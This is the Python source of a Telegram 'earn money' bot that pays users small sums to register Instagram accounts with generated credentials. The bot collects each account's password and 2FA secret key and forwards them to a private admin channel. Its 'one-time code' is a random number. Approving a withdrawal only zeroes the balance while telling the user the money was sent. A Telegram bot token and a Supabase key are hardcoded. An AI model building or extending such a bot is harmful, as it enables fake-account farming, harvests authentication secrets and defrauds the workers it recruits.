import os
import random
import string
import threading
import time
from flask import Flask
import requests
import telebot
from telebot import types

TOKEN = "8974330521:AAE_niErKnWPdQWtrmzWltd8LQ5aleUtj-E"
ADMIN_CHANNEL_ID = "-1004399480886"  # 👈 የእርስዎ Private ቻናል ID

SUPABASE_URL = "https://xtkdjjryooketbgdreez.supabase.co"
SUPABASE_KEY = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh0"
    "a2RqanJ5b29rZXRiZ2RyZWV6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODY2MzUwMTksImV4"
    "cCI6MjEwMjIxMTAxOX0.Oi3LMmZX1m02Z3XPje-iXhQsg3pYDi6Zn80Cpi436Lk"
)

HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json",
    "Prefer": "return=representation",
}

bot = telebot.TeleBot(TOKEN)

try:
  bot.remove_webhook()
except Exception as e:
  print(e)

user_data = {}

# --- RENDER PORT BINDING FIX (FLASK WEB SERVER) ---
app = Flask(__name__)


@app.route("/")
def home():
  return "Bot is running 24/7!"


def run_flask():
  port = int(os.environ.get("PORT", 10000))
  app.run(host="0.0.0.0", port=port)


# ------------------------------------------------


def get_user(chat_id):
  url = f"{SUPABASE_URL}/rest/v1/users?chat_id=eq.{chat_id}&select=*"
  response = requests.get(url, headers=HEADERS)

  if response.status_code == 200:
    data = response.json()
    if not data:
      new_user = {
          "chat_id": chat_id,
          "task_balance": 0.000,
          "invite_balance": 0.000,
          "referrals": 0,
          "referrer_id": None,
      }
      insert_url = f"{SUPABASE_URL}/rest/v1/users"
      requests.post(insert_url, headers=HEADERS, json=new_user)
      return {
          "task_balance": 0.000,
          "invite_balance": 0.000,
          "referrals": 0,
          "referrer_id": None,
      }
    else:
      return {
          "task_balance": float(data[0].get("task_balance", 0.0)),
          "invite_balance": float(data[0].get("invite_balance", 0.0)),
          "referrals": int(data[0].get("referrals", 0)),
          "referrer_id": data[0].get("referrer_id"),
      }
  else:
    return {
        "task_balance": 0.000,
        "invite_balance": 0.000,
        "referrals": 0,
        "referrer_id": None,
    }


def update_user(
    chat_id, task_balance, invite_balance, referrals, referrer_id=None
):
  url = f"{SUPABASE_URL}/rest/v1/users?chat_id=eq.{chat_id}"
  update_data = {
      "task_balance": task_balance,
      "invite_balance": invite_balance,
      "referrals": referrals,
  }
  if referrer_id is not None:
    update_data["referrer_id"] = referrer_id

  requests.patch(url, headers=HEADERS, json=update_data)


def add_task_balance_with_commission(chat_id, earned_amount):
  user = get_user(chat_id)
  new_task_balance = user["task_balance"] + earned_amount
  update_user(
      chat_id,
      new_task_balance,
      user["invite_balance"],
      user["referrals"],
      user["referrer_id"],
  )

  referrer_id = user.get("referrer_id")
  if referrer_id:
    commission = earned_amount * 0.10
    ref_user = get_user(referrer_id)
    new_invite_balance = ref_user["invite_balance"] + commission
    update_user(
        referrer_id,
        ref_user["task_balance"],
        new_invite_balance,
        ref_user["referrals"],
        ref_user["referrer_id"],
    )

    try:
      bot.send_message(
          referrer_id,
          f"🎁 Referral Commission: You earned ${commission:.4f} (10% from"
          " your referral's task) added to your Invite Balance!",
      )
    except:
      pass


def generate_account_info():
  first_names = ["DHEARYE", "SAMUEL", "DAVID", "JOHN", "MICHAEL"]
  last_names = ["SAAWAIYE", "SMITH", "JOHNSON", "BROWN", "WILLIAMS"]
  f_name = random.choice(first_names)
  l_name = random.choice(last_names)
  full_name = f"{f_name} {l_name}"
  random_num = "".join(random.choices(string.digits, k=3))
  base_login = f"{f_name.lower()}_{l_name.lower()}{random_num}"
  password = "".join(
      random.choices(string.ascii_letters + string.digits + "!@#$%", k=10)
  )
  return full_name, base_login, password


def get_main_keyboard():
  markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
  btn_balance = types.KeyboardButton("💰 Balance")
  btn_withdraw = types.KeyboardButton("📤 Withdraw")
  btn_referral = types.KeyboardButton("👩‍👧‍👦 REFERRAL 👩‍👧‍👦")
  markup.add(btn_balance, btn_withdraw, btn_referral)
  return markup


@bot.message_handler(commands=["start"])
def send_welcome(message):
  chat_id = message.chat.id
  user = get_user(chat_id)

  args = message.text.split()
  if len(args) > 1 and args[1].startswith("ref_"):
    try:
      referrer_id = int(args[1].replace("ref_", ""))
      if referrer_id != chat_id and not user.get("referrer_id"):
        ref_user = get_user(referrer_id)
        new_ref_count = ref_user["referrals"] + 1
        update_user(
            referrer_id,
            ref_user["task_balance"],
            ref_user["invite_balance"],
            new_ref_count,
            ref_user.get("referrer_id"),
        )
        update_user(
            chat_id,
            user["task_balance"],
            user["invite_balance"],
            user["referrals"],
            referrer_id,
        )
        bot.send_message(
            referrer_id,
            "🎉 New referral joined! They are now linked to your account.",
        )
    except:
      pass

  text = (
      "🔥 Www Earn Bot — New Task\n\n"
      "🎯 A new earning task is waiting for you!\n\n"
      "📲 Complete the task and collect your reward.\n\n"
      "⚡ Don’t miss this opportunity!\n\n"
      "👇 Click below to open Mini App"
  )

  markup = types.InlineKeyboardMarkup()
  mini_app_url = "https://kiki-man353.github.io/Insta/"
  btn_webapp = types.InlineKeyboardButton(
      "🚀 Open App", web_app=types.WebAppInfo(url=mini_app_url)
  )
  markup.add(btn_webapp)

  bot.send_message(chat_id, "📌 Main Menu", reply_markup=get_main_keyboard())
  bot.send_message(chat_id, text, reply_markup=markup)


# --- STANDARD HANDLERS ---
@bot.message_handler(commands=["task"])
def show_tasks_command(message):
  markup = types.InlineKeyboardMarkup()
  btn_create = types.InlineKeyboardButton(
      "📱 Create Inst (2FA) ($0.025)", callback_data="create_inst"
  )
  markup.add(btn_create)
  bot.send_message(
      message.chat.id,
      "👉 Please select a task:",
      reply_markup=markup,
  )


@bot.message_handler(
    func=lambda message: message.text
    in ["💰 Balance", "📤 Withdraw", "👩‍👧‍👦 REFERRAL 👩‍👧‍👦"]
)
def handle_menu_buttons(message):
  chat_id = message.chat.id
  user = get_user(chat_id)

  if message.text == "💰 Balance":
    total_balance = user["task_balance"] + user["invite_balance"]
    text = (
        "💳 Your Account Balances:\n\n"
        f"📱 Task Balance: ${user['task_balance']:.4f}\n"
        f"🎁 Invite Balance: ${user['invite_balance']:.4f}\n"
        "-----------------------------------\n"
        f"💰 Total Balance: ${total_balance:.4f}"
    )
    bot.send_message(message.chat.id, text)

  elif message.text == "📤 Withdraw":
    total_balance = user["task_balance"] + user["invite_balance"]
    if total_balance >= 1.00:
      markup = types.InlineKeyboardMarkup()
      btn_usdt = types.InlineKeyboardButton(
          "USDT (BEP-20)", callback_data="withdraw_usdt"
      )
      markup.add(btn_usdt)

      bot.send_message(
          message.chat.id,
          "📤 Choose withdraw method:",
          reply_markup=markup,
      )
    else:
      bot.send_message(
          message.chat.id,
          f"⚠️ Minimum withdrawal is $1.00\nYour total balance is"
          f" ${total_balance:.4f}",
      )

  elif message.text == "👩‍👧‍👦 REFERRAL 👩‍👧‍👦":
    bot_username = bot.get_me().username
    ref_link = f"https://t.me/{bot_username}?start=ref_{chat_id}"
    text = (
        "👥 Referral Program (10% Commission):\n\n"
        f"🔗 Your Link: {ref_link}\n\n"
        f"👤 Total Invited: {user['referrals']} users\n"
        "🎁 Reward: You get 10% of what your referrals earn, added to your"
        " Invite Balance!"
    )
    bot.send_message(message.chat.id, text)


# --- WITHDRAW HANDLERS ---
@bot.callback_query_handler(func=lambda call: call.data == "withdraw_usdt")
def select_withdraw_usdt(call):
  chat_id = call.message.chat.id
  user_data[chat_id] = {"waiting_for_withdraw_address": True}

  text = (
      "You selected USDT (BEP-20).\n"
      "📉 Fee: $0.025\n"
      "🔢 Minimum withdrawal amount: $0.20\n"
      "📤 Enter your USDT (BEP-20) address:"
  )
  bot.edit_message_text(text, chat_id, call.message.message_id)


@bot.message_handler(
    func=lambda message: message.chat.id in user_data
    and user_data[message.chat.id].get("waiting_for_withdraw_address")
)
def handle_withdraw_address(message):
  chat_id = message.chat.id
  address = message.text
  user = get_user(chat_id)
  total_balance = user["task_balance"] + user["invite_balance"]

  admin_markup = types.InlineKeyboardMarkup()
  btn_approve = types.InlineKeyboardButton(
      "✅ Approve", callback_data=f"wd_approve_{chat_id}"
  )
  btn_reject = types.InlineKeyboardButton(
      "❌ Reject", callback_data=f"wd_reject_{chat_id}"
  )
  admin_markup.add(btn_approve, btn_reject)

  admin_text = (
      "📤 New Withdrawal Request:\n\n"
      f"User ID: `{chat_id}`\n"
      f"Amount: `${total_balance:.4f}`\n"
      f"USDT Address: `{address}`"
  )

  bot.send_message(ADMIN_CHANNEL_ID, admin_text, reply_markup=admin_markup)
  bot.send_message(
      chat_id,
      "✅ Your withdrawal request has been submitted to admin for review!",
  )

  del user_data[chat_id]


@bot.callback_query_handler(
    func=lambda call: call.data.startswith("wd_approve_")
    or call.data.startswith("wd_reject_")
)
def handle_withdrawal_decision(call):
  data_parts = call.data.split("_")
  action = data_parts[1]
  target_user_id = int(data_parts[2])

  if action == "approve":
    user = get_user(target_user_id)
    update_user(target_user_id, 0.0, 0.0, user["referrals"], user["referrer_id"])

    try:
      bot.send_message(
          target_user_id,
          "🎉 Your withdrawal request has been APPROVED ✅ and sent to your"
          " address!",
      )
    except:
      pass

    bot.edit_message_text(
        f"{call.message.text}\n\nStatus: WITHDRAWAL APPROVED ✅",
        call.message.chat.id,
        call.message.message_id,
    )

  elif action == "reject":
    try:
      bot.send_message(
          target_user_id,
          "❌ Your withdrawal request has been REJECTED by admin.",
      )
    except:
      pass

    bot.edit_message_text(
        f"{call.message.text}\n\nStatus: WITHDRAWAL REJECTED ❌",
        call.message.chat.id,
        call.message.message_id,
    )


# --- TASK HANDLERS ---
@bot.callback_query_handler(func=lambda call: call.data == "create_inst")
def start_inst_task(call):
  full_name, login, password = generate_account_info()
  user_data[call.message.chat.id] = {
      "full_name": full_name,
      "login": login,
      "password": password,
  }

  text = (
      "Task: 📱 Create Inst (2FA)\n\n"
      "Description: Create a new account using the details below:\n"
      f"First name: {full_name}\n"
      f"Login: {login}\n"
      f"Password: {password}\n\n"
      "Please enter your 2FA key to get the code:"
  )

  bot.edit_message_text(text, call.message.chat.id, call.message.message_id)


@bot.message_handler(
    func=lambda message: message.chat.id in user_data
    and "2fa_entered" not in user_data[message.chat.id]
    and not user_data[message.chat.id].get("waiting_for_support")
)
def handle_2fa_key(message):
  chat_id = message.chat.id
  user_data[chat_id]["2fa_key"] = message.text
  user_data[chat_id]["2fa_entered"] = True

  one_time_code = "".join(random.choices(string.digits, k=6))
  user_data[chat_id]["one_time_code"] = one_time_code

  markup = types.InlineKeyboardMarkup()
  btn_registered = types.InlineKeyboardButton(
      "✅ Account registered", callback_data="account_registered"
  )
  markup.add(btn_registered)

  bot.send_message(chat_id, f"Your one-time code is: {one_time_code}")
  bot.send_message(
      chat_id, "👉 Press the button to confirm registration:", reply_markup=markup
  )


@bot.callback_query_handler(func=lambda call: call.data == "account_registered")
def confirm_registration(call):
  chat_id = call.message.chat.id
  if chat_id in user_data:
    data = user_data[chat_id]

    admin_markup = types.InlineKeyboardMarkup()
    btn_approve = types.InlineKeyboardButton(
        "✅ Approve", callback_data=f"approve_{chat_id}"
    )
    btn_reject = types.InlineKeyboardButton(
        "❌ Reject", callback_data=f"reject_{chat_id}"
    )
    admin_markup.add(btn_approve, btn_reject)

    admin_text = (
        "New Task Submission:\n\n"
        f"User ID: {chat_id}\n"
        f"FullName: {data['full_name']}\n"
        f"Login: {data['login']}\n"
        f"Password: {data['password']}\n"
        f"2FA Key: {data.get('2fa_key', 'N/A')}\n"
        f"Generated Code: {data.get('one_time_code', 'N/A')}"
    )

    bot.send_message(ADMIN_CHANNEL_ID, admin_text, reply_markup=admin_markup)
    bot.edit_message_text(
        "✅ Your report has been submitted to admin for verification!",
        chat_id,
        call.message.message_id,
    )
    del user_data[chat_id]


@bot.callback_query_handler(
    func=lambda call: call.data.startswith("approve_")
    or call.data.startswith("reject_")
)
def handle_admin_decision(call):
  data_parts = call.data.split("_")
  action = data_parts[0]
  target_user_id = int(data_parts[1])

  if action == "approve":
    task_reward = 0.025
    add_task_balance_with_commission(target_user_id, task_reward)

    try:
      bot.send_message(
          target_user_id,
          "🎉 Congratulations! Your task has been APPROVED ✅\n$0.025 has been"
          " added to your Task Balance.",
      )
    except:
      pass

    bot.edit_message_text(
        f"{call.message.text}\n\nStatus: APPROVED ✅",
        call.message.chat.id,
        call.message.message_id,
    )

  elif action == "reject":
    try:
      bot.send_message(target_user_id, "❌ Report rejected.")
    except:
      pass
    bot.edit_message_text(
        f"{call.message.text}\n\nStatus: REJECTED ❌",
        call.message.chat.id,
        call.message.message_id,
    )


# --- SUPPORT SYSTEM HANDLERS ---
@bot.message_handler(commands=["support"])
def support_command(message):
  bot.send_message(
      message.chat.id, "📩 Please enter your question/issue for support:"
  )
  user_data[message.chat.id] = {"waiting_for_support": True}


@bot.message_handler(
    func=lambda message: message.chat.id in user_data
    and user_data[message.chat.id].get("waiting_for_support")
)
def handle_support_query(message):
  chat_id = message.chat.id
  query_text = message.text

  support_text = f"📩 #Support_Query\nUser ID: `{chat_id}`\n\nQuestion: {query_text}"
  bot.send_message(ADMIN_CHANNEL_ID, support_text)

  bot.send_message(
      chat_id, "✅ Your message has been sent to support. We will reply soon."
  )
  del user_data[chat_id]


@bot.message_handler(
    func=lambda message: str(message.chat.id) == str(ADMIN_CHANNEL_ID)
    and message.reply_to_message
)
def reply_to_support(message):
  reply_msg = message.reply_to_message.text
  if reply_msg and "#Support_Query" in reply_msg:
    try:
      lines = reply_msg.split("\n")
      user_id = int(lines[1].replace("User ID: `", "").replace("`", ""))

      bot.send_message(user_id, f"💬 Support Reply:\n\n{message.text}")
      bot.reply_to(message, "✅ Reply sent to user.")
    except Exception as e:
      bot.reply_to(message, f"❌ Error: {e}")


# --- MAIN ENTRY POINT (RUNNING FLASK & BOT TOGETHER) ---
if __name__ == "__main__":
  # Flask ሰርቨሩን በሌላ Thread እናስነሳዋለን (Render ፖርት እንዲያገኝ)
  flask_thread = threading.Thread(target=run_flask)
  flask_thread.start()

  # የቴሌግራም ቦቱን በሰርቨር ላይ እናስኬደዋለን
  while True:
    try:
      bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
      print(f"Error: {e}")
      time.sleep(5)
